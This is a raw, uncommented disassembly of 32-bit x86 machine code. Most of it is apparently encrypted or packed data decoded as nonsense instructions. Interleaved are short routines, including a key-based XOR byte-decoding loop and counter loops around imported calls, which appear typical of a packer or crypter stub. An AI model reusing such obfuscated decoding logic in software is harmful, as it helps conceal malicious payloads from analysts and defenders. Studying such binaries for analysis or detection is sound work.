  407aa7:	dec    ebx
  407aa8:	mov    ch,BYTE PTR ds:0x36a11285
  407aae:	sar    eax,0x37
  407ab1:	je     0x407aa8
  407ab3:	or     dl,dl
  407ab5:	outs   dx,DWORD PTR ds:[esi]
  407ab6:	jp     0x407aea
  407ab8:	pop    ss
  407ab9:	loop   0x407a86
  407abb:	mov    bl,0x70
  407abd:	xchg   esi,eax
  407abe:	jl     0x407ad2
  407ac0:	xchg   esp,eax
  407ac1:	repnz mov esi,0x19adafc6
  407ac7:	js     0x407a4e
  407ac9:	push   ds
  407aca:	shl    eax,1
  407acc:	pop    ebx
  407acd:	addr16 jbe 0x407a87
  407ad0:	(bad)  
  407ad1:	and    esi,ebp
  407ad3:	bound  ebx,QWORD PTR [eax-0x7e]
  407ad6:	mov    esi,0x3024d731
  407adb:	mov    dh,0x35
  407add:	mov    ebp,0x33cd3294
  407ae2:	sbb    eax,DWORD PTR [esi+0x5d00804d]
  407ae8:	jg     0x407b48
  407aea:	ror    bh,0xb4
  407aed:	and    DWORD PTR [ebx-0x4e8ca599],0x815d26d4
  407af7:	jg     0x407ac1
  407af9:	popa   
  407afa:	jmp    0x65fa:0x63abdab0
  407b01:	in     eax,dx
  407b02:	mov    ecx,0x74858f1f
  407b07:	xlat   BYTE PTR ds:[ebx]
  407b08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b09:	les    ebx,FWORD PTR [edx+0x6fd58463]
  407b0f:	stos   BYTE PTR es:[edi],al
  407b10:	pop    eax
  407b11:	das    
  407b12:	pushf  
  407b13:	rcl    BYTE PTR [ebx+0x6f],0xd7
  407b17:	call   0x1bab028a
  407b1c:	icebp  
  407b1d:	mov    bh,0x0
  407b1f:	test   cl,0xbc
  407b22:	or     edi,DWORD PTR [edi-0x46d3beb3]
  407b28:	stos   BYTE PTR es:[edi],al
  407b29:	scas   al,BYTE PTR es:[edi]
  407b2a:	dec    esp
  407b2b:	outs   dx,BYTE PTR ds:[esi]
  407b2c:	inc    esp
  407b2d:	mov    ebx,?
  407b2f:	jne    0x407b75
  407b31:	mov    esi,0x22c8d33b
  407b36:	mov    edi,0x40a3a80a
  407b3b:	mov    al,ds:0x19bdd53d
  407b40:	jns    0x407b34
  407b42:	push   es
  407b43:	imul   edx,esi,0x77b67909
  407b49:	jmp    0x45ff:0x30e6a39b
  407b50:	inc    ebx
  407b51:	jae    0x407baf
  407b53:	cmp    dh,BYTE PTR [edi-0x45]
  407b56:	pop    DWORD PTR [eax+esi*8]
  407b59:	imul   esi,edx,0xfffffffe
  407b5c:	xchg   ecx,eax
  407b5d:	xchg   BYTE PTR [ebx],bl
  407b5f:	xchg   esi,eax
  407b60:	jmp    0x8d95:0xc4f25041
  407b67:	adc    edx,DWORD PTR [ebp-0xd]
  407b6a:	cmp    eax,0x252312e1
  407b6f:	sti    
  407b70:	cmp    bh,BYTE PTR [esp+eax*1+0x5e6d46b6]
  407b77:	sbb    DWORD PTR [edi+0x10],ecx
  407b7a:	jo     0x407b89
  407b7c:	fcmovnb st,st(0)
  407b7e:	loopne 0x407bc2
  407b80:	mov    al,0x68
  407b82:	out    0xe3,eax
  407b84:	ins    BYTE PTR es:[edi],dx
  407b85:	sbb    eax,0xd34e4f0d
  407b8a:	push   cs
  407b8b:	popf   
  407b8c:	(bad)  
  407b8d:	call   0x3d46:0xe9af8603
  407b94:	pop    ecx
  407b95:	(bad)  
  407b96:	pusha  
  407b97:	inc    ebp
  407b98:	retf   
  407b99:	mov    dh,0x9f
  407b9b:	push   ecx
  407b9c:	adc    ah,BYTE PTR ds:0x7d03a92c
  407ba2:	adc    BYTE PTR [ebx],dh
  407ba4:	rol    DWORD PTR [ebx],1
  407ba6:	(bad)  
  407ba7:	cmp    edx,edi
  407ba9:	ja     0x407bff
  407baf:	push   ebx
  407bb0:	jmp    0x407bba
  407bb5:	mov    esi,0x32729f
  407bba:	mov    eax,DWORD PTR [ebp-0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x4]
  407bc0:	xor    edi,ecx
  407bc2:	add    edi,esi
  407bc4:	mov    esi,DWORD PTR [ebp+0x8]
  407bc7:	imul   edi,edx
  407bca:	mov    ebx,DWORD PTR [ebp+0xc]
  407bcd:	xor    eax,ecx
  407bcf:	add    eax,edx
  407bd1:	mov    al,BYTE PTR [ebx+eax*1+0x32729f]
  407bd8:	mov    BYTE PTR [edi+esi*1],al
  407bdb:	mov    eax,DWORD PTR [ebp-0x4]
  407bde:	xor    eax,ecx
  407be0:	lea    edx,[edx+eax*1+0x32729f]
  407be7:	mov    eax,DWORD PTR [ebp-0x4]
  407bea:	xor    eax,ecx
  407bec:	mov    esi,0xffcd8d61
  407bf1:	sub    esi,eax
  407bf3:	add    esi,DWORD PTR [ebp+0x10]
  407bf6:	cmp    edx,esi
  407bf8:	jbe    0x407bb5
  407bfe:	pop    ebx
  407bff:	mov    eax,0xf89c853b
  407c04:	pop    edi
  407c05:	pop    esi
  407c06:	leave  
  407c07:	ret    0xc
  407c0a:	push   ebp
  407c0b:	mov    ebp,esp
  407c0d:	mov    eax,ds:0x40d654
  407c12:	mov    DWORD PTR ds:0x417e3d,0x19
  407c1c:	cmp    DWORD PTR ds:0x417e3d,0x0
  407c23:	je     0x407c51
  407c29:	cmp    DWORD PTR ds:0x417e3d,0x1c
  407c30:	jne    0x407c3f
  407c36:	push   DWORD PTR [ebp-0x14]
  407c39:	call   DWORD PTR ds:0x40d368
  407c3f:	mov    ecx,DWORD PTR ds:0x417e3d
  407c45:	dec    ecx
  407c46:	mov    DWORD PTR ds:0x417e3d,ecx
  407c4c:	jmp    0x407c1c
  407c51:	mov    edx,0x32729f
  407c56:	sub    eax,edx
  407c58:	mov    ecx,0x7510859
  407c5d:	and    DWORD PTR ds:0x41237c,0x41abd2
  407c67:	push   esi
  407c68:	and    DWORD PTR ds:0x41abd2,0x0
  407c72:	push   DWORD PTR ds:0x41abd2
  407c78:	pop    esi
  407c79:	inc    esi
  407c7a:	mov    DWORD PTR ds:0x41abd2,esi
  407c80:	cmp    DWORD PTR ds:0x41abd2,0x28
  407c87:	jne    0x407ca2
  407c8d:	push   0x7e5a
  407c92:	push   0x41abde
  407c97:	push   0x1ce6
  407c9c:	call   DWORD PTR ds:0x40d1e0
  407ca2:	cmp    DWORD PTR ds:0x41abd2,0x1f
  407ca9:	jb     0x407c72
  407caf:	xor    DWORD PTR ds:0x412354,ebx
  407cb5:	mov    esi,DWORD PTR [ebp+0xc]
  407cb8:	xor    eax,ecx
  407cba:	jmp    0x407e39
  407cbf:	xchg   ebp,eax
  407cc0:	bound  ecx,QWORD PTR [ecx-0x6a06a6f5]
  407cc6:	pusha  
  407cc7:	jmp    0xa0ee:0x70fdba79
  407cce:	dec    esp
  407ccf:	jmp    0xdcbefae7
  407cd4:	jg     0x407d54
  407cd6:	jle    0x407cba
  407cd8:	cmp    eax,0xc4cbb7bf
  407cdd:	scas   al,BYTE PTR es:[edi]
  407cde:	and    BYTE PTR [esi],cl
  407ce0:	sbb    al,0x3f
  407ce2:	sub    ebx,esp
  407ce4:	sti    
  407ce5:	add    BYTE PTR [ebx],dl
  407ce7:	leave  
  407ce8:	mov    eax,0x40ec31e9
  407ced:	pop    es
  407cee:	sbb    eax,0xec735024
  407cf3:	scas   eax,DWORD PTR es:[edi]
  407cf4:	test   eax,0xc330bc77
  407cf9:	test   eax,0xafc445a2
  407cfe:	mov    ch,0xe8
  407d00:	push   ds
  407d01:	push   eax
  407d02:	dec    ebp
  407d03:	pop    edx
  407d04:	xor    eax,0x99962c33
  407d09:	sub    edx,DWORD PTR [eax*1-0x57a54b15]
  407d10:	xor    esi,edx
  407d12:	test   eax,0x333b461a
  407d17:	push   esi
  407d18:	push   ss
  407d19:	bound  edx,QWORD PTR gs:[ebx]
  407d1c:	leave  
  407d1d:	add    eax,0x22cd855f
  407d22:	xchg   DWORD PTR [ecx+0x28],ebx
  407d25:	repnz fnstenv [ecx+eax*4+0x0]
  407d2a:	add    al,0x1c
  407d2c:	cli    
  407d2d:	cmp    al,0xd4
  407d2f:	imul   edi,esi,0xafadc20c
  407d35:	in     eax,0xa
  407d37:	push   0xcfc35b9d
  407d3c:	cli    
  407d3d:	jb     0x407d0a
  407d3f:	mov    DWORD PTR [edi],ecx
  407d41:	pop    ecx
  407d42:	aas    
  407d43:	ja     0x407db0
  407d45:	repnz imul ebp,ebx,0xffffffa0
  407d49:	mov    ecx,0xda4723e0
  407d4e:	add    DWORD PTR [edx+0x14],esp
  407d51:	loope  0x407dac
  407d53:	retf   
  407d54:	fstp   DWORD PTR [edx+0x18e5c0c8]
  407d5a:	xchg   ecx,eax
  407d5b:	into   
  407d5c:	inc    esp
  407d5d:	inc    esi
  407d5e:	cmp    BYTE PTR [esi-0x73],dh
  407d61:	jns    0x407d9a
  407d63:	and    al,0x71
  407d65:	call   FWORD PTR [edi+0x4c9e4f63]
  407d6b:	push   eax
  407d6c:	pause  
  407d6e:	sub    al,BYTE PTR [ecx-0x6]
  407d71:	clc    
  407d72:	sub    eax,0x51b5745d
  407d77:	or     ch,BYTE PTR [edi-0x25]
  407d7a:	mov    ecx,0x5ddde3b2
  407d7f:	jmp    0x9b44d319
  407d84:	inc    ebx
  407d85:	clc    
  407d86:	cld    
  407d87:	mov    WORD PTR [edi+0x5ff0c0d1],gs
  407d8d:	jp     0x407e0a
  407d8f:	add    al,0x9f
  407d91:	xchg   BYTE PTR [eax+0x771bead9],dh
  407d97:	addr16 push cs
  407d99:	pushf  
  407d9a:	pop    ecx
  407d9b:	sub    BYTE PTR [ecx-0x40e4ce0],dh
  407da1:	loopne 0x407d8e
  407da3:	mov    esp,0x72fc6e79
  407da8:	adc    eax,ebp
  407daa:	xor    al,0x66
  407dac:	imul   ebp,DWORD PTR [ebx-0x30227683],0xffffff85
  407db3:	scas   al,BYTE PTR es:[edi]
  407db4:	jbe    0x407d6c
  407db6:	or     eax,0xfc4208f8
  407dbb:	mov    ds:0x2ea6d9b,al
  407dc0:	fstp   TBYTE PTR [edx-0x73db0cc8]
  407dc6:	(bad)  
  407dc7:	sub    DWORD PTR [edx-0x46e9482],eax
  407dcd:	je     0x407e2e
  407dcf:	arpl   WORD PTR [esi-0x496b031e],ax
  407dd5:	shr    eax,0x87
  407dd8:	out    0x64,al
  407dda:	repz fisubr WORD PTR [edx]
  407ddd:	mov    BYTE PTR [ecx-0x5d8472b8],al
  407de3:	inc    edx
  407de4:	rol    DWORD PTR [ecx-0x41bda55f],0x76
  407deb:	fwait
  407dec:	sbb    bl,BYTE PTR [edx-0x26]
  407def:	pop    ebx
  407df1:	int    0x42
  407df3:	jb     0x407e07
  407df5:	xor    BYTE PTR [ebx],ch
  407df7:	and    BYTE PTR [edx],0xb8
  407dfa:	or     DWORD PTR [ecx],0x8ab49359
  407e00:	rcl    DWORD PTR [ebx],cl
  407e02:	xor    esp,ebp
  407e04:	out    dx,al
  407e05:	jne    0x407ddc
  407e07:	imul   ebp,DWORD PTR [ecx],0xffffff8f
  407e0a:	jne    0x407e23
  407e0c:	dec    edi
  407e0d:	test   al,0x12
  407e0f:	cld    
  407e10:	in     al,0xc6
  407e12:	je     0x407e1e
  407e14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e15:	cmc    
  407e16:	inc    ebx
  407e17:	pop    esp
  407e18:	int3   
  407e19:	xor    bl,BYTE PTR [esi+0x6a]
  407e1c:	and    eax,0xd0c93ffc
  407e21:	int3   
  407e22:	outs   dx,BYTE PTR ds:[esi]
  407e23:	shr    DWORD PTR [ebx+ebp*1-0xaa2f99a],1
  407e2a:	lea    esp,[eax+0x59780251]
  407e30:	pushf  
  407e31:	cdq    
  407e32:	sbb    ebp,0xffffffa9
  407e35:	xchg   DWORD PTR [esi],esi
  407e37:	ror    esi,1
  407e39:	cmp    eax,esi
  407e3b:	mov    DWORD PTR ds:0x41abe2,0x45d5
  407e45:	je     0x40818a
  407e4b:	mov    eax,ds:0x40d64c
  407e50:	mov    esi,DWORD PTR [ebp+0xc]
  407e53:	sub    eax,edx
  407e55:	xor    eax,ecx
  407e57:	cmp    eax,esi
  407e59:	jne    0x407e6f
  407e5f:	mov    eax,ds:0x40d654
  407e64:	add    eax,DWORD PTR ds:0x40d64c
  407e6a:	jmp    0x407ff5
  407e6f:	mov    eax,DWORD PTR [ebp+0xc]
  407e72:	jmp    0x407ff1
  407e77:	icebp  
  407e78:	mov    ebp,0x65db1f07
  407e7d:	mov    ecx,0x1c6c5851
  407e82:	cmp    DWORD PTR [ecx],edx
  407e84:	test   eax,0x104f355a
  407e89:	jle    0x407f09
  407e8b:	fdivr  QWORD PTR [edi+0x7e]
  407e8e:	jle    0x407e66
  407e90:	mov    eax,ds:0x5fb77a
  407e95:	daa    
  407e96:	das    
  407e97:	outs   dx,BYTE PTR ds:[esi]
  407e98:	add    cl,BYTE PTR [edx-0x56]
  407e9b:	stc    
  407e9c:	lds    esp,FWORD PTR [ebp+eiz*4+0x56]
  407ea0:	sbb    dh,BYTE PTR [edi+0x630e5123]
  407ea6:	jns    0x407e64
  407ea8:	pop    es
  407ea9:	pop    es
  407eaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407eab:	loope  0x407e71
  407ead:	xlat   BYTE PTR ds:[ebx]
  407eae:	xor    ebp,DWORD PTR [eax-0x632e9daf]
  407eb4:	loope  0x407e8e
  407eb6:	je     0x407e7d
  407eb8:	out    dx,al
  407eb9:	imul   esi,DWORD PTR [ebx+0x2aa25d53],0x21
  407ec0:	in     al,dx
  407ec1:	xchg   esp,eax
  407ec2:	(bad)  
  407ec3:	(bad)  
  407ec4:	push   eax
  407ec5:	fisubr DWORD PTR es:0x1a5a5de7
  407ecc:	sub    BYTE PTR [ecx+0x53f4c320],dh
  407ed2:	fcom   QWORD PTR [ecx-0x77be1f5a]
  407ed8:	dec    esi
  407ed9:	mov    ds:0x8f52ca8e,eax
  407ede:	call   0x7fd8989c
  407ee3:	xchg   esp,eax
  407ee4:	stos   BYTE PTR es:[edi],al
  407ee5:	inc    esp
  407ee6:	push   cs
  407ee7:	imul   al
  407ee9:	inc    eax
  407eea:	xor    eax,0x5ae04cf6
  407eef:	scas   al,BYTE PTR es:[edi]
  407ef0:	in     al,0x37
  407ef2:	int    0x5e
  407ef4:	jns    0x407f68
  407ef6:	and    al,0x8a
  407ef8:	pop    esp
  407ef9:	mov    dh,0xd2
  407efb:	jb     0x407f26
  407efd:	out    0xe2,eax
  407eff:	fcmovnu st,st(5)
  407f01:	retf   
  407f02:	enter  0x912,0x26
  407f06:	xchg   ebp,eax
  407f07:	push   0xffffff96
  407f09:	sub    cl,al
  407f0b:	ret    
  407f0c:	popa   
  407f0d:	mov    cl,al
  407f0f:	sub    dl,BYTE PTR [eax-0x3fe13b19]
  407f15:	rcl    DWORD PTR [eax+0x333ac92f],1
  407f1b:	es dec ecx
  407f1d:	adc    esp,ecx
  407f1f:	cdq    
  407f20:	(bad)  [edx-0x4e001bb2]
  407f26:	jbe    0x407f6c
  407f28:	icebp  
  407f29:	cs loope 0x407f52
  407f2c:	mov    eax,0x12e7adcf
  407f31:	rcl    DWORD PTR [esp+ebx*8],cl
  407f34:	pop    es
  407f35:	test   dh,ch
  407f37:	fcomp  QWORD PTR [esi]
  407f39:	aas    
  407f3a:	mov    cl,BYTE PTR [edx-0x7d2d69fe]
  407f40:	clc    
  407f41:	rol    DWORD PTR [eax-0x2d010eef],cl
  407f47:	outs   dx,DWORD PTR ds:[esi]
  407f48:	repnz inc eax
  407f4a:	int3   
  407f4b:	xor    eax,0xddbf1b51
  407f50:	repnz test al,0x4c
  407f53:	pusha  
  407f54:	mov    al,ds:0xe5f6c142
  407f59:	adc    eax,0x27fd2221
  407f5e:	mov    ds:0x54e9087d,al
  407f63:	pop    ebx
  407f64:	inc    edx
  407f65:	or     DWORD PTR [edi],esp
  407f67:	pop    ebx
  407f68:	lods   al,BYTE PTR ds:[esi]
  407f69:	cmp    al,0xdb
  407f6b:	and    dl,0x81
  407f6e:	in     al,dx
  407f6f:	rol    DWORD PTR [ebp+0x2ca54e56],1
  407f75:	not    BYTE PTR [edx+0x60]
  407f78:	das    
  407f79:	inc    edx
  407f7a:	and    ch,bl
  407f7c:	loopne 0x407f95
  407f7e:	mov    BYTE PTR es:[edx+0x11c10adb],al
  407f85:	mov    BYTE PTR ds:0xc1fd1edf,ah
  407f8b:	sbb    DWORD PTR [edx+0x54a3b179],esi
  407f91:	inc    edi
  407f92:	fst    DWORD PTR [eax]
  407f94:	retf   0xcae2
  407f97:	inc    edx
  407f98:	sbb    eax,0xf96ff454
  407f9d:	xor    BYTE PTR [ecx+ebp*1-0x52],0xce
  407fa2:	sub    bl,BYTE PTR [esi-0x4257ff2f]
  407fa8:	jbe    0x408017
  407faa:	(bad)  
  407fab:	ins    DWORD PTR es:[edi],dx
  407fac:	inc    esi
  407fad:	add    BYTE PTR [ebx-0x6d],0x94
  407fb1:	xor    al,0xba
  407fb3:	dec    esp
  407fb4:	and    eax,0x75960c8
  407fb9:	and    DWORD PTR [eax-0x2fce4cf7],esp
  407fbf:	gs leave 
  407fc1:	sub    DWORD PTR [edi-0x31],edi
  407fc4:	mov    DWORD PTR [eax+0x42cf6c90],eax
  407fca:	dec    esi
  407fcb:	js     0x407f7c
  407fcd:	les    ebx,FWORD PTR [eax+0x28]
  407fd0:	test   dl,cl
  407fd2:	push   esi
  407fd3:	sub    esi,DWORD PTR [edx+0x11]
  407fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fd7:	(bad)  
  407fd8:	lods   al,BYTE PTR ds:[esi]
  407fd9:	std    
  407fda:	add    al,0x44
  407fdc:	mov    esi,0xe8a84373
  407fe1:	inc    esp
  407fe2:	jbe    0x407f98
  407fe4:	dec    edx
  407fe5:	icebp  
  407fe6:	enter  0x4f36,0x43
  407fea:	xchg   DWORD PTR [edx+ebp*1-0x22],ecx
  407fee:	(bad)  
  407fef:	aam    0x1a
  407ff1:	xor    eax,ecx
  407ff3:	add    eax,edx
  407ff5:	mov    ds:0x40d64c,eax
  407ffa:	mov    eax,DWORD PTR [ebp+0xc]
  407ffd:	jmp    0x40817c
  408002:	and    ebp,DWORD PTR [edi]
  408004:	pop    ds
  408005:	xchg   edx,eax
  408006:	adc    esp,DWORD PTR [edx+0x57bdafa3]
  40800c:	arpl   WORD PTR [edi],si
  40800e:	test   al,0x44
  408010:	xor    edx,eax
  408012:	sub    eax,0xdc7e7e16
  408017:	jg     0x408097
  408019:	jle    0x407fe8
  40801b:	pop    edx
  40801c:	fmul   QWORD PTR [ebx+0x701d9a81]
  408022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408023:	int3   
  408024:	dec    edx
  408025:	xchg   ebx,eax
  408026:	cmp    DWORD PTR [ecx-0x34],0xfa3b4636
  40802d:	push   ebp
  40802e:	or     DWORD PTR [esi-0x45a194a1],edi
  408034:	dec    edi
  408035:	je     0x40803d
  408037:	cmc    
  408038:	push   esi
  408039:	iret   
  40803a:	push   eax
  40803b:	in     al,0xd6
  40803d:	pop    ebx
  40803e:	(bad)  
  408040:	pop    ebx
  408041:	cmp    DWORD PTR [edi-0x6e],0xffffffab
  408045:	retf   0xc80b
  408048:	dec    dl
  40804a:	sbb    edi,edx
  40804c:	pop    ebp
  40804d:	mov    esi,0x26c6b86d
  408052:	scas   al,BYTE PTR es:[edi]
  408053:	sub    al,0xbc
  408055:	mov    fs,edi
  408057:	loop   0x40802e
  408059:	adc    edi,ecx
  40805b:	addr16 pop ss
  40805d:	cmp    DWORD PTR [ebx-0x44d32bee],eax
  408063:	push   ecx
  408064:	pop    ds
  408065:	sub    DWORD PTR [ecx+0x41],ebp
  408068:	pop    ss
  408069:	push   esp
  40806a:	xor    eax,0xb81c9ea3
  40806f:	pop    eax
  408070:	and    cl,BYTE PTR [esi]
  408072:	xor    eax,0x5703c1a7
  408077:	icebp  
  408078:	cmp    DWORD PTR [ebx],esi
  40807a:	retf   
  40807b:	mov    dh,0x6a
  40807d:	pusha  
  40807e:	cwd    
  408080:	push   edx
  408081:	adc    al,0x4e
  408083:	in     eax,0x75
  408085:	xor    ch,bh
  408087:	mov    dh,0x58
  408089:	add    ch,ah
  40808b:	pop    ds
  40808c:	out    dx,eax
  40808d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40808e:	mov    ah,dh
  408090:	pop    eax
  408091:	cmc    
  408092:	mov    eax,DWORD PTR ds:0x1ea6a02
  408098:	cmp    eax,0xe34baf60
  40809d:	shl    DWORD PTR ss:[ebx],cl
  4080a0:	and    eax,0x291e2c78
  4080a5:	fisub  DWORD PTR [ebx+0x6d3e465d]
  4080ab:	hlt    
  4080ac:	repz sub BYTE PTR [esi-0x11],0xc
  4080b1:	sti    
  4080b2:	arpl   WORD PTR [eax+ecx*2],bp
  4080b5:	push   0x4fca2613
  4080ba:	sahf   
  4080bb:	js     0x40807e
  4080bd:	shl    DWORD PTR ds:0xce1b1166,1
  4080c3:	fiadd  WORD PTR [esp+eax*4-0x31]
  4080c7:	xchg   ebx,eax
  4080c8:	or     BYTE PTR [ecx],ah
  4080ca:	mul    BYTE PTR [esi-0x63]
  4080cd:	data16 fwait
  4080cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080d0:	stc    
  4080d1:	retf   
  4080d2:	dec    edi
  4080d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080d5:	sbb    DWORD PTR [esi+0x12],edx
  4080d8:	jp     0x408133
  4080da:	xlat   BYTE PTR ds:[ebx]
  4080db:	jle    0x4080e1
  4080dd:	call   0x93fb:0x8c2db21e
  4080e4:	push   ds
  4080e5:	test   DWORD PTR [eax+0x69],eax
  4080e8:	add    BYTE PTR [ebp+0x25],cl
  4080eb:	sub    eax,0xaf785851
  4080f0:	sub    BYTE PTR [ecx+0x16f6d8a2],ah
  4080f6:	sbb    dh,bl
  4080f8:	ret    
  4080f9:	jl     0x4080e9
  4080fb:	enter  0x932,0xed
  4080ff:	sbb    eax,0xcafbe950
  408104:	retf   0x22fe
  408107:	loopne 0x408185
  408109:	mov    ebx,0x2e6b64ae
  40810e:	shl    DWORD PTR [edx],0xd6
  408111:	adc    eax,0x81196b24
  408116:	jbe    0x408128
  408118:	in     eax,0x3a
  40811a:	clc    
  40811b:	into   
  40811c:	xor    esp,ecx
  40811e:	sub    cl,BYTE PTR [ecx]
  408120:	sub    DWORD PTR [edi+0x2822f8a7],esi
  408126:	loop   0x40810c
  408128:	hlt    
  408129:	pop    ebp
  40812a:	hlt    
  40812b:	xor    BYTE PTR [esi+0x703a3c0c],ah
  408131:	xor    DWORD PTR [edx-0x5f9b609f],edi
  408137:	lods   eax,DWORD PTR ds:[esi]
  408138:	sahf   
  408139:	add    cl,BYTE PTR ds:[ebx-0x41ff1363]
  408140:	and    eax,esp
  408142:	ret    0x5c12
  408145:	inc    eax
  408146:	int3   
  408147:	aaa    
  408148:	loopne 0x40815a
  40814a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40814b:	je     0x40813d
  40814d:	xor    al,0x7a
  40814f:	scas   al,BYTE PTR es:[edi]
  408150:	scas   eax,DWORD PTR es:[edi]
  408151:	xor    dl,ah
  408153:	lahf   
  408154:	push   eax
  408155:	nop
  408156:	sbb    esi,DWORD PTR [eax-0x22]
  408159:	ds push ss
  40815b:	lock das 
  40815d:	pusha  
  40815e:	cmp    dh,BYTE PTR [esi+ebp*2+0x24]
  408162:	xlat   BYTE PTR ds:[ebx]
  408163:	push   0xe6dde428
  408168:	loop   0x4080ed
  40816a:	push   cs
  40816b:	popa   
  40816c:	into   
  40816d:	rcr    BYTE PTR [edi-0x10],0x4b
  408171:	jmp    0x408130
  408173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408174:	jmp    0xd34bfe99
  408179:	add    ch,0x9a
  40817c:	xor    eax,ecx
  40817e:	add    eax,edx
  408180:	mov    ds:0x40d654,eax
  408185:	jmp    0x408313
  40818a:	mov    eax,ds:0x40d654
  40818f:	jmp    0x40830e
  408194:	push   edi
  408195:	(bad)  [ecx+0x797ba9ef]
  40819b:	gs mov ch,0x6e
  40819e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40819f:	es mov es:0x17838af3,eax
  4081a6:	jle    0x408226
  4081a8:	fdivr  QWORD PTR [edi+0x7e]
  4081ab:	jle    0x4081f7
  4081ad:	and    bh,BYTE PTR [ecx+0x1adb9d19]
  4081b3:	add    eax,0xf927a20f
  4081b8:	mov    ecx,0xe19ee03d
  4081bd:	sbb    eax,0x92bc668e
  4081c2:	xchg   BYTE PTR ds:0xb93470f4,cl
  4081c8:	jmp    0x4081b4
  4081ca:	add    edx,DWORD PTR [esi-0x7f069dcc]
  4081d0:	nop
  4081d1:	and    eax,0xbabcc251
  4081d6:	sbb    al,0x49
  4081d8:	dec    esi
  4081d9:	jb     0x408250
  4081db:	inc    edi
  4081dc:	jmp    0x5396:0xbbeaa63a
  4081e3:	sbb    BYTE PTR ds:[ebp+0x3ee20d87],dl
  4081ea:	cmp    DWORD PTR [edx+edx*2+0xf],ebp
  4081ee:	sbb    ebp,DWORD PTR [edi]
  4081f0:	cli    
  4081f1:	push   esi
  4081f2:	push   eax
  4081f3:	sub    BYTE PTR [ecx],0x2d
  4081f6:	into   
  4081f7:	mov    ah,0x89
  4081f9:	mov    esi,0xc7fff1d4
  4081fe:	mov    ds:0x4934e2f,eax
  408203:	sti    
  408204:	in     eax,dx
  408205:	pop    edi
  408206:	out    dx,al
  408207:	inc    ebp
  408208:	pop    eax
  408209:	adc    eax,0x1849a009
  40820e:	mov    al,ds:0x8fb645ff
  408213:	or     DWORD PTR [ebx+eiz*1+0x7b14034],ebx
  40821a:	or     edi,ecx
  40821c:	fisubr DWORD PTR [edx+0x65]
  40821f:	aas    
  408220:	test   BYTE PTR [ecx-0x10981d75],bh
  408226:	jbe    0x408210
  408228:	mov    DWORD PTR [edx-0xb],ebp
  40822b:	push   cs
  40822c:	sub    al,0xea
  40822e:	(bad)  
  408230:	pop    eax
  408231:	jae    0x4081cc
  408233:	dec    ebp
  408234:	inc    ebx
  408235:	rol    DWORD PTR [ebx-0x2d73a3a0],1
  40823b:	outs   dx,BYTE PTR ds:[esi]
  40823c:	jecxz  0x4081e0
  40823e:	push   ds
  40823f:	adc    BYTE PTR [ecx-0x55558caf],0xa3
  408246:	push   ss
  408247:	aam    0x64
  408249:	mov    DWORD PTR [eax],ebp
  40824b:	aad    0xd7
  40824d:	sbb    eax,0xeff46456
  408252:	push   ss
  408253:	shl    BYTE PTR [eax],1
  408255:	inc    eax
  408256:	and    ch,al
  408258:	push   cs
  408259:	sbb    DWORD PTR [ecx],esp
  40825b:	sbb    ch,BYTE PTR [ebx]
  40825d:	mov    edx,0xe035557e
  408262:	push   esp
  408263:	push   edi
  408264:	clc    
  408265:	cld    
  408266:	cli    
  408267:	cmp    BYTE PTR [eax-0xee8c4e1],al
  40826d:	xchg   ebx,eax
  40826e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40826f:	scas   eax,DWORD PTR es:[edi]
  408270:	out    0x96,eax
  408272:	sub    ch,BYTE PTR [eax-0x5e]
  408275:	push   ds
  408276:	in     eax,dx
  408277:	movnti DWORD PTR [edx+0x26],ecx
  40827b:	cmovno edi,DWORD PTR [ecx-0xe18543a]
  408282:	xor    eax,0xce86ee47
  408287:	mov    WORD PTR [esi],?
  408289:	or     ebp,DWORD PTR [edx-0x524da67b]
  40828f:	jecxz  0x40822d
  408291:	inc    ebx
  408292:	inc    ebx
  408293:	es push es
  408295:	inc    ebp
  408296:	xchg   esi,eax
  408297:	(bad)  
  408298:	lods   eax,DWORD PTR ds:[esi]
  408299:	pop    esp
  40829a:	push   esi
  40829b:	clc    
  40829c:	mov    ds:0x94896487,al
  4082a1:	retf   0x528
  4082a4:	iret   
  4082a5:	add    esp,DWORD PTR [edi-0x78]
  4082a8:	push   ebp
  4082a9:	out    0x45,eax
  4082ab:	dec    esi
  4082ac:	and    al,0xf6
  4082ae:	stc    
  4082af:	ds das 
  4082b1:	push   es
  4082b2:	jmp    0x408324
  4082b4:	jae    0x408275
  4082b6:	hlt    
  4082b7:	or     DWORD PTR [ebp+0x12b6186f],0xffffff96
  4082be:	imul   ebp,DWORD PTR [eax+0x3f],0xed1ca7a2
  4082c5:	ss push ss
  4082c7:	pop    edx
  4082c8:	nop
  4082c9:	sbb    eax,ebx
  4082cb:	push   esi
  4082cc:	hlt    
  4082cd:	ret    
  4082ce:	mov    dl,0xaf
  4082d0:	cwde   
  4082d1:	outs   dx,DWORD PTR ds:[esi]
  4082d2:	sbb    al,0x53
  4082d4:	adc    ebx,edx
  4082d6:	loopne 0x4082c1
  4082d8:	and    DWORD PTR [esi],ebx
  4082da:	inc    ebx
  4082db:	dec    edi
  4082dc:	add    BYTE PTR [ecx+eiz*4-0x4],ch
  4082e0:	dec    edx
  4082e1:	cs push eax
  4082e3:	push   esp
  4082e4:	ret    
  4082e5:	int    0xc9
  4082e7:	push   ds
  4082e8:	pop    es
  4082e9:	mov    esp,0xdcbf70ab
  4082ee:	sar    dl,1
  4082f0:	ja     0x408331
  4082f2:	rcl    edx,cl
  4082f4:	out    dx,eax
  4082f5:	out    dx,eax
  4082f6:	icebp  
  4082f7:	fimul  DWORD PTR [ebp+0x34446434]
  4082fd:	jno    0x4082c9
  4082ff:	pop    ebp
  408300:	sub    DWORD PTR [esi+eiz*8+0x3d6398b7],ecx
  408307:	into   
  408308:	jl     0x4082c5
  40830a:	nop
  40830b:	leave  
  40830c:	xchg   edi,eax
  40830d:	push   0x40d64ca3
